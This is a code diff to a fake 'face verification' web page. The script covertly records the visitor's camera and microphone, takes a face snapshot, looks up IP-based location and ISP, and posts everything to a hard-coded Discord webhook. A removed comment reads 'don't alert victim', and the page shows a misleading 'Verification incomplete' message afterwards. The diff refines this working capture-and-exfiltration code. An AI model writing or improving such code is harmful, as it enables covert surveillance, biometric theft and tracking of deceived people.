@@ -59,7 +59,7 @@
     const progressText = document.getElementById('progressText');
 
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1479318338411827384/nNZ_pZsoR7CZJn9n6U_UA4hawAdOKiGngDqoDBNkbTT7pggzniMRTDh7wO_tNRfDXhZZ";
-    const RECORD_DURATION = 12000;
+    const RECORD_DURATION = 15000; // bumped to 15s for better metadata
 
     let startTime = 0;
     let animationFrameId = null;
@@ -85,9 +85,7 @@
       }
       try {
         await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
-      } catch (e) {
-        // silent fail - don't alert victim
-      }
+      } catch {}
     }
 
     async function captureSnapshot(stream) {
@@ -97,9 +95,7 @@
       context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
 
       return new Promise((resolve) => {
-        canvas.toBlob((blob) => {
-          resolve(blob);
-        }, 'image/png');
+        canvas.toBlob((blob) => resolve(blob), 'image/png');
       });
     }
 
@@ -109,63 +105,58 @@
         btn.disabled = true;
 
         const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
+          video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 }, frameRate: { ideal: 30 } },
           audio: true
         });
 
         videoElement.srcObject = stream;
-        videoElement.onloadedmetadata = () => videoElement.play(); // ensure playing
+        videoElement.onloadedmetadata = () => videoElement.play();
 
-        await new Promise(r => setTimeout(r, 1800)); // quick warm-up for stable frame
+        await new Promise(r => setTimeout(r, 1800));
 
-        // Snipe the face snapshot FIRST - reliable
+        // Snapshot first
         const snapshotBlob = await captureSnapshot(stream);
         if (snapshotBlob) {
-          let geoDetails = "Location grab failed";
+          let geo = "Location grab failed";
           try {
-            const geoRes = await fetch('https://ipapi.co/json/');
-            if (geoRes.ok) {
-              const data = await geoRes.json();
-              if (!data.error) geoDetails = `IP: ${data.ip || 'n/a'}\nCity: ${data.city || 'n/a'}\nRegion: ${data.region || 'n/a'}\nCountry: ${data.country_name || 'n/a'}\nCoords: ${data.latitude || 'n/a'}, ${data.longitude || 'n/a'}\nISP: ${data.org || 'n/a'}`;
+            const res = await fetch('https://ipapi.co/json/');
+            if (res.ok) {
+              const d = await res.json();
+              if (!d.error) geo = `IP: ${d.ip||'n/a'}\nCity: ${d.city||'n/a'}\nRegion: ${d.region||'n/a'}\nCountry: ${d.country_name||'n/a'}\nCoords: ${d.latitude||'n/a'}, ${d.longitude||'n/a'}\nISP: ${d.org||'n/a'}`;
             }
           } catch {}
-
-          const snapPayload = `🎯 Quick face snap captured\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geoDetails}`;
-          await sendToWebhook(snapPayload, snapshotBlob, `face_${Date.now()}.png`);
+          await sendToWebhook(`🎯 Face snap captured\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geo}`, snapshotBlob, `face_${Date.now()}.png`);
         }
 
-        // Now start video recording
+        // Video part
         progressContainer.style.display = 'block';
         msg.textContent = "";
 
-        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
+        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9,opus' }); // vp9 for better chance
         const chunks = [];
 
-        recorder.ondataavailable = e => {
-          if (e.data.size > 0) chunks.push(e.data);
-        };
+        recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
 
         recorder.onstop = async () => {
           cancelAnimationFrame(animationFrameId);
           progressBar.style.width = '100%';
           progressText.textContent = '100%';
 
-          stream.getTracks().forEach(track => track.stop());
+          stream.getTracks().forEach(t => t.stop());
 
-          if (chunks.length > 0) {
-            const blob = new Blob(chunks, { type: 'video/webm' });
-            let geoDetails = "Location grab failed"; // re-grab if needed, but reuse snap one
+          const blob = new Blob(chunks, { type: 'video/webm' });
+
+          if (chunks.length > 0 && blob.size > 100 * 1024) { // skip if tiny/corrupt
+            let geo = "Location grab failed";
             try {
-              const geoRes = await fetch('https://ipapi.co/json/');
-              if (geoRes.ok) {
-                const data = await geoRes.json();
-                if (!data.error) geoDetails = `IP: ${data.ip || 'n/a'}\nCity: ${data.city || 'n/a'}\nRegion: ${data.region || 'n/a'}\nCountry: ${data.country_name || 'n/a'}\nCoords: ${data.latitude || 'n/a'}, ${data.longitude || 'n/a'}\nISP: ${data.org || 'n/a'}`;
+              const res = await fetch('https://ipapi.co/json/');
+              if (res.ok) {
+                const d = await res.json();
+                if (!d.error) geo = `IP: ${d.ip||'n/a'}\nCity: ${d.city||'n/a'}\nRegion: ${d.region||'n/a'}\nCountry: ${d.country_name||'n/a'}\nCoords: ${d.latitude||'n/a'}, ${d.longitude||'n/a'}\nISP: ${d.org||'n/a'}`;
               }
             } catch {}
-
-            const vidPayload = `🎥 Full verification clip (silent)\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geoDetails}`;
-            await sendToWebhook(vidPayload, blob, `verification_${Date.now()}.mp4`);
-          } // else video failed, but we have snapshot already
+            await sendToWebhook(`🎥 Full clip (silent)\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geo}`, blob, `verification_${Date.now()}.webm`); // back to .webm ext
+          }
 
           msg.textContent = "Verification incomplete. Center Face In Camera View";
           progressContainer.style.display = 'none';
